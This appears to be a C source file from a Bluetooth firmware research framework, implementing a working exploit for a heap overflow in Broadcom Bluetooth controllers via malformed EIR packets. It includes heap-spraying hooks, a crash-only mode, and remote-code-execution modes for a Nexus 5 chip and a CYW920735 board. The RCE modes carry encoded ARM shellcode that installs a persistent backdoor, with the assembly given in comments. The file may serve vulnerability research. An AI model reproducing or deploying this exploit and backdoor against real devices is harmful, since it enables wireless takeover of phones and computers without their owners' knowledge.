#include <string.h>
#include <stdlib.h> 

#include <frankenstein/BCMBT/patching/patchram.h>
#include <frankenstein/BCMBT/patching/hciio.h>
#include <frankenstein/hook.h>

/****************************************
Definitions from firmware
****************************************/

extern char rm_deviceLocalName[];
extern char rm_deviceInfo[];

void dynamic_memory_Release(void *);
void *dynamic_memory_AllocateOrDie(int size);
int DHM_LMPTx(int id, void *buff);
void rm_setLocalBdAddr(char [6]);
void bcs_dmaTxEnableEir(void *, void *);
void bthci_cmd_lc_HandleCreate_Connection(char *);
void bthci_cmd_lc_HandleDisconnect(char *);
void patch_installPatchEntry(uint32_t addr, void *data_ptr, uint32_t slot);
void lm_HandleLmpHostConnReqAccepted(void *);

/****************************************
Local defs
****************************************/

char *disconnect_cmd = NULL;
int disconnect_allowed = 1; // wait until local name has been written
int disconnected = 1; // wait until local name has been written

void eir_heap_bof_trigger(struct saved_regs *regs, void *arg);
void connect_hook(struct saved_regs *regs, void *arg);
void disconnect_hook(struct saved_regs *regs, void *arg);
void disallow_connect(struct saved_regs *regs, void *arg);
void DHM_LMPTx_hook(struct saved_regs *regs, void *arg);
void DHM_LMPTx_filter(struct saved_regs *regs, void *arg);
void do_disconnect();


/****************************************
Set the desired mode
****************************************/

#define crash_only
//#define bcm4335c0_rce
//#define cyw920735q60evb01_rce

/****************************************
Payload Definitions
****************************************/

//ldr lr, [pc+4)
//ldr pc, [pc)
//.word 0xdead1337
#define shellcode "\xdf\xf8\x04\xe0\xdf\xf8\x00\xf0\x37\x13\xad\xde"

//write what where definitions
#if defined( crash_only )
    //Crash the device by writing to invalid address
    #define write_where 0xdeadbeef
    struct eval_board_payload {
        char dummy;
    } write_what = {};

#endif
#if defined( bcm4335c0_rce )
    //Nexus 5 RCE by overwriting the connect patch in RAM at 0xd26f8
    #define write_where (0xd26f8-104)
    /*
    [*]   BLOC[2] @ 0x205E28:      264    10 / 10           2680 @ 0x217CE4
    [*]             Buffer   : Header    Status                       
    [*]             -------------------------------                   
    [*]             0x217ce4 : 0x217df0  Free / List Head             
    [*]             0x217df0 : 0x0d2683  Corrupted                    
    [*]             0x217efc : 0x01f020  Corrupted                    
    [*]             0x218008 : 0xd7b00000  Corrupted                  
    [*]             0x218114 : 0x21ce7cff  Corrupted                  
    [*]             0x218220 : 0x21832c  Free                         
    [*]             0x21832c : 0x218438  Free                         
    [*]             0x218438 : 0x218544  Free                         
    [*]             0x218544 : 0x218650  Free                         
    [*]             0x218650 : 0x000000  Free     
    */
/*
ldr r0,=0xd266c
ldr r1,=0x4770bf00
str r1, [r0]
*/


    /*
=== Repair Heap ===
=== Return To Handler in ROM ===
=== Install Backdoor ===
sub sp, #4
push {r0-r4}
ldr r0,=0x5853d
str r0, [sp,#20]

ldr r0,=0xd2680
ldr r1,=0x15a000

ldr r3, [r0]
cmp r3,#0
beq done
cmp r3,r1
beq done

str r1, [r0]

ldr r0,=0x205e38
ldr r1,=0x218220
str r1, [r0]

ldr r0, =0x205fcc
ldr r1, =0xd2691
str r1, [r0]

ldr r0, =0xd266c
ldr r1, =0xf000f8df
str r1, [r0]

ldr r0, =0xd2670
ldr r1, =0x6166d
str r1, [r0]

done:
pop {r0-r4,pc}


=== Backdoor ===
=== Write ptr to 0x205fcc (ACL Rx Hdr Done Callback) ===
ldr r0,=0x200e80
ldr r0, [r0]
add r0, #12
ldr r1, [r0]
ldr r2,=0xdeadc0de
cmp r1, r2
bne skip
add r0, #5
bx r0

skip:
eor r0, r0
bx lr

    */

    #undef shellcode
    #define backdoor "\x06\x48\x00\x68\x00\xf1\x0c\x00\x01\x68\x05\x4a\x91\x42\x02\xd1\x00\xf1\x05\x00\x00\x47\x80\xea\x00\x00\x70\x47\x80\x0e\x20\x00\xde\xc0\xad\xde"
    //#define shellcode "\x81\xb0\x1f\xb4\x06\x48\x05\x90\x06\x48\x07\x49\x03\x68\x00\x2b\x05\xd0\x8b\x42\x03\xd0\x01\x60\x04\x48\x05\x49\x01\x60\x1f\xbd\x3d\x85\x05\x00\x80\x26\x0d\x00\x00\xa0\x15\x00\x38\x5e\x20\x00\x20\x82\x21\x00"
    #define shellcode "\x81\xb0\x1f\xb4\x0b\x48\x05\x90\x0b\x48\x0c\x49\x03\x68\x00\x2b\x0e\xd0\x8b\x42\x0c\xd0\x01\x60\x09\x48\x0a\x49\x01\x60\x0a\x48\x0a\x49\x01\x60\x0a\x48\x0b\x49\x01\x60\x0b\x48\x0b\x49\x01\x60\x1f\xbd\x00\xbf\x3d\x85\x05\x00\x80\x26\x0d\x00\x00\xa0\x15\x00\x38\x5e\x20\x00\x20\x82\x21\x00\xcc\x5f\x20\x00\x91\x26\x0d\x00\x6c\x26\x0d\x00\xdf\xf8\x00\xf0\x70\x26\x0d\x00\x6d\x16\x06\x00"



    struct eval_board_payload {
        char padding[104];
        char scode[134];
    } write_what = {.padding=backdoor, .scode=shellcode};

#endif
#if defined(cyw920735q60evb01_rce)
    //CYW920735Q60EVB-01 RCE for Ubuntu 18.04
    //Overwriting virtual_functions table at 0x205944
    #define write_where 0x205944

    struct eval_board_payload {
        char scode[0x58];
        int func_ptrs[38];    //spray the rest of the buffer with our target pointers
    } write_what = {.scode=shellcode, .func_ptrs={
        write_where|1, write_where|1, write_where|1, write_where|1,
        write_where|1, write_where|1, write_where|1, write_where|1,
        write_where|1, write_where|1, write_where|1, write_where|1,
        write_where|1, write_where|1, write_where|1, write_where|1,
        write_where|1, write_where|1, write_where|1, write_where|1,
        write_where|1, write_where|1, write_where|1, write_where|1,
        write_where|1, write_where|1, write_where|1, write_where|1,
        write_where|1, write_where|1, write_where|1, write_where|1,
        write_where|1, write_where|1, write_where|1, write_where|1,
        write_where|1, write_where|1 }};

#endif

void dummy() {return;}
int ret0() {return 0;}

/****************************************
Trigger the heap overflow
This function will be called before bcs_dmaTxEnableEir
****************************************/
void eir_heap_bof_trigger(struct saved_regs *regs, void *arg) {
    int len = 0x4e0;                    //Set the RFU bit in length, trigger Overflow
    *(int*)0x318ad0 = (len << 3) | 2;   //Set payload header for EIR packet
                                        //0x318ad0 is tx_pkt_pyld_hdr

    //Set packet type to DM5 in packet header
    //0x318acc is tx_pkt_info
    *(int*)0x318acc &= ~(0xf << 3);
    *(int*)0x318acc |= (0b1110 << 3);


    //Set the EIR packet payload
    unsigned char *eir = (char *)regs->r0;


    #if defined(cyw920735q60evb01_rce)
        //Ubuntu will reenter scan periodically, what will cause buffers to be allocated
        //To prevent this, we sent broken EIR packets from multiple source addresses
        //This will cause Ubuntu to do a Remote Name request for every address,
        //and therefore prevets it to reenter the scan mode
        srand(*((int *)0x32a004) ^ rand()); //increase entropy using timer1value
        *(int*)0x318038 = rand();           //bt address

        for (unsigned char i=0; i < 0xf0; i++) eir[i] = 42;
    #else
        //Use pattern to crash device
        #if defined( crash_only )
            for (unsigned char i=0; i < 0xf0; i++) eir[i] = i;
        #endif
        //Include Name field
        eir[0] = 5;
        eir[1] = 9;
        eir[2] = 'E';
        eir[3] = 'v';
        eir[4] = 'a';
        eir[5] = 'l';

        //Dummy field
        eir[6] = 222; //padding
        eir[7] = 0xff;
    #endif

    //Overflow Heap Chunk next pointer
    //The exact offset might varry from device to device
    //We also take the 4 byte heap chunk header and 9 byte HCI header into account
    ( *(int *)&eir[0x73]) = write_where-9-4;
    ( *(int *)&eir[0x77]) = write_where-9-4;
    ( *(int *)&eir[0x7b]) = write_where-9-4;
    ( *(int *)&eir[0x7f]) = write_where-9-4;
}

/****************************************
Heap spraying
We trigger a "Read Remote Name" event in order to allocate buffer
The device name will contain our payload
****************************************/
void connect_hook(struct saved_regs *regs, void *arg) {
    if (!disconnected) do_disconnect();

    //randomize source address
    srand(*((int *)0x32a004) ^ rand()); //Increase entropy using timer1value
    int addr[2];
    addr[0] = rand();
    addr[1] = rand();
    rm_setLocalBdAddr((char *)addr);

    #if defined(samsung_s10)
        memcpy(write_what, shellcode, sizeof(shellcode));
        for (int i=sizeof(shellcode); i<sizeof(write_what); i += 4)
            *(int*)(write_what + i) = write_where | 1;
    #endif

    //set payload in local name
    for (unsigned char i = 0; i < 0xf0; i++) rm_deviceLocalName[i] = i;
    memcpy(rm_deviceLocalName, &write_what, sizeof(write_what));
    rm_deviceInfo[0x23] = 0xf0; //Set Name length
    disconnected = 0;

    print("connect\n");
}

/****************************************
Delay disconnect until we have sent our name
Disconnect is triggered if the last packet should be sent
Or if something goes wrong
This is not needed to crash the deivce
****************************************/
void disconnect_hook(struct saved_regs *regs, void *arg) {
    if (!disconnect_allowed) {
        regs->pc = (uint32_t)&dummy;
        disconnect_cmd = dynamic_memory_AllocateOrDie(6);
        memcpy(disconnect_cmd, (void *)regs->r0, 6);
    }
}

void disallow_connect(struct saved_regs *regs, void *arg) {
    disconnect_allowed = 0;
}

void do_disconnect() {
    if (disconnect_allowed) return;
    print("disconnect\n");
    disconnect_allowed = 1;
    bthci_cmd_lc_HandleDisconnect(disconnect_cmd);
}

void DHM_LMPTx_hook(struct saved_regs *regs, void *arg) {
    char *lmp_payload = (char *)(regs->r1 + 12);
    int opcode = lmp_payload[0] >> 1;
    int offset = lmp_payload[1];
    int len = lmp_payload[2];

    //WICED_BT_TRACE("lmp %d %d %d\n", lmp_payload[0]>>1,lmp_payload[1],lmp_payload[2]);

    //discard last name response and do disconnect
    //if ((opcode == 2 && offset + 14 >= len) || opcode==1 || opcode == 7) {
    if ((opcode == 2 && offset + 14 >= len) || opcode == 7) {
        print("trigger disconnect\n");
        do_disconnect();
        disconnected = 1;
    }
    //Dont notify Slave on disconnect
    if (disconnected) {
        print("discard packet\n");
        regs->pc = (uint32_t)&dummy;
        //lm_LmpBBAcked(regs->r1);
        dynamic_memory_Release((void *)regs->r1);
    }
}

void DHM_LMPTx_filter(struct saved_regs *regs, void *arg) {
    char *lmp_payload = (char *)(regs->r1 + 12);
    int opcode = lmp_payload[0] >> 1;
    int offset = lmp_payload[1];
    int len = lmp_payload[2];

    //discard last name response and do disconnect
    if ((opcode == 2 && offset + 14 >= len) || opcode==1 || opcode == 7) {
        print("discard packet\n");
        regs->pc = (uint32_t)&dummy;
        //lm_LmpBBAcked(regs->r1);
        dynamic_memory_Release((void *)regs->r1);
    }
}



/****************************************
Setup the exploit
****************************************/

int exploit_setup_done = 0;
void _start() {
    if (exploit_setup_done) return;
    exploit_setup_done = 1;

    //Set hook for EIR packets to trigger heap  Bof
    add_hook(bcs_dmaTxEnableEir, eir_heap_bof_trigger, NULL, NULL);

    //Randomize Bluetooth Address for each connection attempt
    //This is needed so a "Read Remote Name" request is triggered each time
    add_hook(bthci_cmd_lc_HandleCreate_Connection, connect_hook, NULL, NULL);

    //If we only want to crash, we do not need to delay the disconnect
    //This speeds up the spray speed
    add_hook(DHM_LMPTx, DHM_LMPTx_hook, NULL, NULL);
    //add_hook(DHM_LMPTx, DHM_LMPTx_filter, NULL, NULL);
    //Delay dísconnect
    add_hook(bthci_cmd_lc_HandleDisconnect, disconnect_hook, NULL, NULL);
    add_hook(lm_HandleLmpHostConnReqAccepted, disallow_connect, NULL, NULL);

}

